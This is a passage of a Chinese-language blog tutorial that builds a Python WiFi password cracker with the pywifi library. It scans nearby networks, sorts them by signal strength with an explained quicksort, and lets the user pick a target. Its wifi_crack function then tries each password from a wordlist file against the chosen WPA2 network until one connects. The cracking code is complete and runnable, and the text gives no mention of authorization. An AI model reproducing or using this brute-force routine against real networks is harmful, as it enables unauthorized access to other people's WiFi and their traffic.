class="comment">#不知道为啥pywifi会多扫描一个，所以-1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;*&quot;</span> * <span class="number">20</span> + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#print(wifi_list_parameter)</span></span><br><span class="line">    <span class="keyword">return</span> wifi_list_parameter</span><br></pre></td></tr></table></figure></div>

<hr>
<p>接下来就是我们要处理我们获取的WiFi信息了，我们要根据WiFi的信号强度进行排序。</p>
<p>这是<code>wifi_list_parameter</code>字典中的数据：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;SSID&#x27;</span>: [<span class="string">&#x27;szpjwfhm&#x27;</span>, <span class="string">&#x27;MERCURY_9CEE&#x27;</span>, <span class="string">&#x27;szpjwfhm_5G&#x27;</span>, <span class="string">&#x27;CMCC-5Z94&#x27;</span>, <span class="string">&#x27;szpjwfhm&#x27;</span>], <span class="string">&#x27;Singnal level&#x27;</span>: [-<span class="number">58</span>, -<span class="number">81</span>, -<span class="number">74</span>, -<span class="number">65</span>, -<span class="number">58</span>], <span class="string">&#x27;BSSID&#x27;</span>: [<span class="string">&#x27;cc:2d:21:e5:cc:b1:&#x27;</span>, <span class="string">&#x27;6c:59:40:7e:9c:ee:&#x27;</span>, <span class="string">&#x27;cc:2d:21:e5:cc:b5:&#x27;</span>, <span class="string">&#x27;ec:6c:b5:ea:3f:28:&#x27;</span>, <span class="string">&#x27;cc:2d:21:e5:cc:b1:&#x27;</span>], <span class="string">&#x27;Frequency&#x27;</span>: [<span class="number">2417000</span>, <span class="number">2472000</span>, <span class="number">5745000</span>, <span class="number">2442000</span>, <span class="number">2417000</span>]&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们要把信号强度大的放在前面，所以我们需要对这个字典进行排序。</p>
<p>我们先写一个函数<code>read_wifi_data()</code>来读取字典中的数据，然后再写一个函数进行排序，即<code>indexed_quicksort()</code>函数。</p>
<blockquote>
<p>不过，<code>read_wifi_data()</code>函数的功能基于<code>wifi_scan()</code>函数，所以，我们先写排序。</p>
</blockquote>
<blockquote>
<p>在这里我们选择<code>快速排序</code>算法，用<strong>快速排序</strong>算法来把信号强度大的放在前面，然后获取排序前的索引，然后根据索引来获取排序后的数据。一般来说，排序是把小的数字放在前面，大的数字放在后面，但是WiFi的强度<code>signal</code>是负数,越接近0，网络强度越好，所以，我们选择把信号强度大的放在前面。</p>
</blockquote>
<hr>
<p>快速排序算法我们暂时不讲，后面咱们专门出一期排序算法的文章。(快速排序算法并不难，大家可以用调试器，去看看它的原理，我给出大家可以调试的代码,这个代码大家新建一个文件复制过去直接调试就行了)</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">indexed_quicksort</span>(<span class="params">array</span>):</span><br><span class="line">    <span class="comment"># 创建一个包含 (值, 原始索引) 的列表</span></span><br><span class="line">    arr_with_index = [(value, index) <span class="keyword">for</span> index, value <span class="keyword">in</span> <span class="built_in">enumerate</span>(array)]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 快速排序函数，对 arr_with_index 进行排序</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">quicksort</span>(<span class="params">arr</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(arr) &lt;= <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> arr</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 随机选择基准元素</span></span><br><span class="line">            pivot_index = random.randint(<span class="number">0</span>, <span class="built_in">len</span>(arr) - <span class="number">1</span>)</span><br><span class="line">            pivot = arr[pivot_index][<span class="number">0</span>]</span><br><span class="line">            left = []  <span class="comment"># 小于基准的元素</span></span><br><span class="line">            right = []  <span class="comment"># 大于基准的元素</span></span><br><span class="line">            middle = []  <span class="comment"># 等于基准的元素</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> value, original_index <span class="keyword">in</span> arr:</span><br><span class="line">                <span class="keyword">if</span> value &lt; pivot:</span><br><span class="line">                    left.append((value, original_index))</span><br><span class="line">                <span class="keyword">elif</span> value &gt; pivot:</span><br><span class="line">                    right.append((value, original_index))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    middle.append((value, original_index))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> quicksort(right) + middle + quicksort(left)  <span class="comment"># 将较大的元素放在前面</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 执行快速排序</span></span><br><span class="line">    sorted_arr_with_index = quicksort(arr_with_index)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 提取排序后的值和原始索引</span></span><br><span class="line">    <span class="comment"># sorted_values = [value for value, _ in sorted_arr_with_index]  # 获取排序后的值</span></span><br><span class="line">    sorted_original_indices = [index <span class="keyword">for</span> _, index <span class="keyword">in</span> sorted_arr_with_index]  <span class="comment"># 获取排序后的值的原始索引，用来匹配WiFi的信息</span></span><br><span class="line">    <span class="comment"># print(sorted_original_indices)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sorted_original_indices</span><br><span class="line"></span><br><span class="line">ee = indexed_quicksort([<span class="number">3</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(ee)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<hr>
<p>我们现在需要知道的是，<code>indexed_quicksort()</code>函数返回的是<strong>排序后</strong>的值的<strong>原始索引</strong>，所以，我们需要根据这个索引来获取<strong>排序后的值</strong>。</p>
<p>比如这个代码：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">ee = indexed_quicksort([<span class="number">3</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>输出：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">排序前：</span><br><span class="line">ee = [<span class="number">3</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line">排序后：</span><br><span class="line">ee_1 =[<span class="number">10</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>]</span><br><span class="line">原始索引(排序后的值的索引，即<span class="number">10</span>在ee[<span class="number">3</span>], <span class="number">8</span>在ee[<span class="number">2</span>], <span class="number">6</span>在ee[<span class="number">1</span>]...)：</span><br><span class="line">[<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">6</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<p>我们就得继续写<code>read_wifi_data()</code>函数，来读取字典中的数据，然后再根据索引来获取排序后的值。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">read_wifi_data</span>(<span class="params">self,item_dict</span>):<span class="comment">#读取wifi数据，传入的item_dict为字典类型，包含wifi信息</span></span><br><span class="line">    <span class="comment">#&#123;&#x27;SSID&#x27;: &#123;&#x27;MERCURY_9CEE&#x27;, &#x27;szpjwfhm_5G&#x27;, &#x27;szpjwfhm&#x27;, &#x27;CMCC-5Z94&#x27;&#125;, &#x27;Singnal level&#x27;: &#123;-71, -70, -59, -83&#125;, &#x27;BSSID&#x27;: &#123;&#x27;cc:2d:21:e5:cc:b1:&#x27;, &#x27;cc:2d:21:e5:cc:b5:&#x27;, &#x27;6c:59:40:7e:9c:ee:&#x27;, &#x27;ec:6c:b5:ea:3f:28:&#x27;&#125;, &#x27;Frequency&#x27;: &#123;2417000, 2472000, 5745000, 2447000&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;正在处理数据...&quot;</span>)</span><br><span class="line">    <span class="comment">#将信号强度列表进行排序</span></span><br><span class="line">    wifi_list = <span class="variable language_">self</span>.indexed_quicksort(item_dict[<span class="string">&#x27;Singnal level&#x27;</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;排序完成&quot;</span> + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#读取wifi数据</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正在读取wifi数据...&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">20</span> + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    wifi_signal_list = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(wifi_list)):</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;正在读取第%d个wifi数据...&quot;</span> % (num))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;WiFi编号：%d&quot;</span> % (num))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;名称：%s&quot;</span> % item_dict[<span class="string">&#x27;SSID&#x27;</span>][wifi_list[i]])</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;MAC地址：%s&quot;</span> % item_dict[<span class="string">&#x27;BSSID&#x27;</span>][wifi_list[i]])</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;频率：%s&quot;</span> % item_dict[<span class="string">&#x27;Frequency&#x27;</span>][wifi_list[i]])</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;信号强度：%s&quot;</span> % item_dict[<span class="string">&#x27;Singnal level&#x27;</span>][wifi_list[i]])</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">        wifi_signal_list.append(item_dict[<span class="string">&#x27;SSID&#x27;</span>][wifi_list[i]])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>+<span class="string">&quot;读取完成&quot;</span>)</span><br><span class="line">    <span class="comment">#print(wifi_signal_list)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>+<span class="string">&quot;*&quot;</span> * <span class="number">20</span>)</span><br><span class="line">    <span class="keyword">return</span> i,wifi_signal_list</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>排完序，我们再创建一个<code>wifi_signal_list</code>列表，把排序后的信号强度大的放在前面，当然我们只放WiFi的名字(SSID)就行了,再前面的<code>pywifi</code>库中，WiFi的配置只需要名字和密码，名字我们放在这里，密码我们就放在text文件中了。</p>
<p>最后，我们把<code>read_wifi_data()</code>函数的返回值<code>i,wifi_signal_list</code>返回，即<code>i</code>是排序后的索引，<code>wifi_signal_list</code>是排序后的WiFi的名字(SSID)的列表，因为我们要选择要破解的WiFi，所以我就需要<code>i</code>这个参数来确保我们的输入的数字是正确的，能让我们正确索引列表。</p>
<p><strong>注意</strong>：<code>i</code>是从0开始的，所以到时候判断输入的索引范围的时候要注意一下。</p>
<hr>
<p>接下来，按照思路，我们应该写一个来选择要破解的WiFi的函数，即<code>wifi_attack_choose</code>函数。</p>
<p>这个函数，我们要传入，我们上个编写的函数的<code>i</code>参数，以及<code>wifi_signal_list</code>参数，然后，我们就能根据<code>i</code>参数来选择要破解的WiFi。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">wifi_attack_choose</span>(<span class="params">self,count,singnal_list</span>):<span class="comment">#选择需要破解的wifi</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 选择需要破解的wifi</span></span><br><span class="line">        choose_wifi = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入需要破解的wifi的编号：&quot;</span>)) - <span class="number">1</span>  <span class="comment"># 因为索引是从0开始的，所以这里要减1</span></span><br><span class="line">        <span class="keyword">if</span> choose_wifi &lt; <span class="number">0</span> <span class="keyword">or</span> choose_wifi &gt; count:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;输入错误，请重新输入&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><code>choose_wifi</code>数字是比<code>i</code>大一的，因为<code>i</code>是从0开始，而平常我们是从一开始的，所以，我们要减1。</p>
</blockquote>
<p>写完这个函数，我们就要开始配置文件了。</p>
<hr>
<p>按照我们<code>pywifi</code>库的使用方法，我们先写一个简单的配置</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">profile = Profile()</span><br><span class="line">profile.ssid = <span class="string">&quot;需要破解的wifi名称&quot;</span>  <span class="comment"># wifi名称</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 网卡开放状态</span></span><br><span class="line"><span class="comment"># &quot;Auth - AP&quot; 验证算法</span></span><br><span class="line">profile.auth = const.AUTH_ALG_OPEN</span><br><span class="line"></span><br><span class="line"><span class="comment"># WiFi的加密算法为&quot;WPA&quot;</span></span><br><span class="line"><span class="comment"># 选择WiFi加密算法</span></span><br><span class="line"><span class="comment"># &quot;Akm - AP&quot; 的密钥管理</span></span><br><span class="line">profile.akm.append(const.AKM_TYPE_WPA2PSK)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密单元</span></span><br><span class="line"><span class="comment"># &quot;Cipher - AP&quot; 密码类型</span></span><br><span class="line">profile.cipher = const.CIPHER_TYPE_CCMP  <span class="comment"># 加密单元</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置密码</span></span><br><span class="line">profile.key = 字典中保存的密码  <span class="comment"># wifi密码</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">self</span>.iface.remove_all_network_profiles()  <span class="comment"># 删除所有wifi配置文件</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">self</span>.iface.add_network_profile(profile)  <span class="comment"># 添加wifi配置文件</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">self</span>.iface.connect(profile)  <span class="comment"># 连接wifi</span></span><br><span class="line">time.sleep(<span class="number">1</span>) <span class="comment">#等待连接,这个可以防止连接过快导致无法连接</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="variable language_">self</span>.iface.status() == const.IFACE_CONNECTED:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;密码: %s 校验成功&quot;</span> % try_password)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>+<span class="string">&quot;密码为：%s&quot;</span> % try_password)</span><br><span class="line">    <span class="built_in">input</span>(<span class="string">&quot;按任意键退出&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;密码: %s 校验失败&quot;</span> % try_password)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>这就是我们的配置，我们想想，我们要干什么，要循环读取字典中保存的密码进行尝试，所以，我们就得循环读取字典中的密码，然后尝试连接，如果连接成功，就打印密码，如果连接失败，就继续尝试下一个密码。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">path = <span class="string">&quot;wifi_password.txt&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line">    data = data.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>我们这里读取密码的文本文件，文件中每一行保存一个密码，所以，我们要用<code>split()</code>函数把文件的换行符去掉。</p>
</blockquote>
<blockquote>
<p>然后我们循环遍历字典</p>
</blockquote>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">wifi_crack</span>(<span class="params">self,wifi_name_attack</span>):<span class="comment">#破解wifi密码</span></span><br><span class="line">     <span class="built_in">print</span>(<span class="string">&quot;正在破解wifi密码...&quot;</span>)</span><br><span class="line">     <span class="comment"># 读取字典文件</span></span><br><span class="line">     <span class="comment"># 字典文件格式：text</span></span><br><span class="line"></span><br><span class="line">     path = <span class="string">&quot;wifi_password.txt&quot;</span></span><br><span class="line">     <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">         data = f.read()</span><br><span class="line">         data = data.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">         <span class="keyword">for</span> try_password <span class="keyword">in</span> data:</span><br><span class="line"></span><br><span class="line">             <span class="comment">#print(line)</span></span><br><span class="line"></span><br><span class="line">             profile = Profile()</span><br><span class="line">             profile.ssid = wifi_name_attack  <span class="comment"># wifi名称</span></span><br><span class="line"></span><br><span class="line">             <span class="comment"># 网卡开放状态</span></span><br><span class="line">             <span class="comment"># &quot;Auth - AP&quot; 验证算法</span></span><br><span class="line">             profile.auth = const.AUTH_ALG_OPEN</span><br><span class="line"></span><br><span class="line">             <span class="comment"># WiFi的加密算法为&quot;WPA&quot;</span></span><br><span class="line">             <span class="comment"># 选择WiFi加密算法</span></span><br><span class="line">             <span class="comment"># &quot;Akm - AP&quot; 的密钥管理</span></span><br><span class="line">             profile.akm.append(const.AKM_TYPE_WPA2PSK)</span><br><span class="line"></span><br><span class="line">             <span class="comment"># 加密单元</span></span><br><span class="line">             <span class="comment"># &quot;Cipher - AP&quot; 密码类型</span></span><br><span class="line">             profile.cipher = const.CIPHER_TYPE_CCMP  <span class="comment"># 加密单元</span></span><br><span class="line"></span><br><span class="line">             <span class="comment"># 设置密码</span></span><br><span class="line">             profile.key = try_password  <span class="comment"># wifi密码</span></span><br><span class="line"></span><br><span class="line">             <span class="variable language_">self</span>.iface.remove_all_network_profiles()  <span class="comment"># 删除所有wifi配置文件</span></span><br><span class="line"></span><br><span class="line">             <span class="variable language_">self</span>.iface.add_network_profile(profile)  <span class="comment"># 添加wifi配置文件</span></span><br><span class="line"></span><br><span class="line">             <span class="variable language_">self</span>.iface.connect(profile)  <span class="comment"># 连接wifi</span></span><br><span class="line">             time.sleep(<span class="number">1</span>) <span class="comment">#等待连接,这个可以防止连接过快导致无法连接</span></span><br><span class="line"></span><br><span class="line">             <span class="keyword">if</span> <span class="variable language_">self</span>.iface.status() == const.IFACE_CONNECTED:</span><br><span class="line">                 <span class="built_in">print</span>(<span class="string">&quot;密码: %s 校验成功&quot;</span> % try_password)</span><br><span class="line">                 <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>+<span class="string">&quot;密码为：%s&quot;</span> % try_password)</span><br><span class="line">                 <span class="built_in">input</span>(<span class="string">&quot;按任意键退出&quot;</span>)</span><br><span class="line">                 <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">             <span class="keyword">else</span>:</span><br><span class="line">                 <span class="built_in">print</span>(<span class="string">&quot;密码: %s 校验失败&quot;</span> % try_password)</span><br><span class="line">                 <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>这样，我们的WiFi密码破解器就完成了。</p>
<hr>
<h3 id="代码解析-快速排序算法"><a href="#代码解析-快速排序算法" class="headerlink" title="代码解析:快速排序算法"></a>代码解析:快速排序算法</h3><p>下面是代码示例：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quicksort</span>(<span class="params">array</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(array) &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> array</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 随机选择基准元素</span></span><br><span class="line">        pivot_index = random.randint(<span class="number">0</span>, <span class="built_in">len</span>(array) - <span class="number">1</span>)</span><br><span class="line">        pivot = array[pivot_index]</span><br><span class="line">        left = []  <span class="comment"># 小于基准的元素</span></span><br><span class="line">        right = []  <span class="comment"># 大于基准的元素</span></span><br><span class="line">        middle = []  <span class="comment"># 等于基准的元素</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> value <span class="keyword">in</span> array:</span><br><span class="line">            <span class="keyword">if</span> value &lt; pivot:</span><br><span class="line">                left.append(value)</span><br><span class="line">            <span class="keyword">elif</span> value &gt; pivot:</span><br><span class="line">                right.append(value)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                middle.append(value)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将较大的元素放在前面</span></span><br><span class="line">        <span class="keyword">return</span> quicksort(right) + middle + quicksort(left)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行快速排序</span></span><br><span class="line">sorted_array = quicksort([<span class="number">3</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(sorted_array)</span><br></pre></td></tr></table></figure></div>

<p>大家可以把这一段代码复制到一个新的py文件中</p>
<p>快速排序的步骤：</p>
<ul>
<li>选择基准元素：通常是数组中间的元素，也可以是随机选择的元素</li>
<li>分区：根据基准把数组分成两部分，一部分小于基准，一部分大于基准</li>
<li>递归排序：递归地将上述步骤应用到基准左边和右边的子数组上。</li>
<li>合并：将排序好的两部分合并成一个数组</li>
</ul>
<p>我们的代码就是按照这个步骤来实现的。</p>
<p>假设我们<code>pivot_index</code>是<code>2</code>,那么我们选择的基准数就是<code>8</code>，那么递归数组，我们的<code>left</code>数组就是<code>[3, 6, 1, 2, 1]</code>，<code>right</code>数组就是<code>[10]</code>，<code>middle</code>数组就是<code>[8]</code>。</p>
<p>然后我们再递归排序<code>left</code>数组，<code>right</code>数组。</p>
<p><code>right</code>数组就一个数他会直接返回这个数组，而递归<code>left</code>数组，他就会按照上面的流程从新选择基准数，然后分区，然后再去调用自身，再去分区，直到排序完成。</p>
<p>这样说，并不直观，但是我们只要去调试代码，就能理解快速排序的原理。</p>
<p>所以，希望大家亲自去调试一下代码，看看它是如何工作的。</p>
<hr>
<p><strong>最后欣赏一下自己的成果吧！</strong></p>
<h1 id="如果你感觉这篇文章不错，而且财力充足的话，希望可以用爱发电支持一下作者，感谢支持！"><a href="#如果你感觉这篇文章不错，而且财力充足的话，希望可以用爱发电支持一下作者，感谢支持！" class="headerlink" title="如果你感觉这篇文章不错，而且财力充足的话，希望可以用爱发电支持一下作者，感谢支持！"></a>如果你感觉这篇文章不错，而且财力充足的话，希望可以用爱发电支持一下作者，感谢支持！</h1><blockquote>
<p>爱发电地址:<a class="link"   href="https://afdian.com/a/AuroraBreeze" >https://afdian.com/a/AuroraBreeze <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>pywifi</tag>
      </tags>
  </entry>
</search>
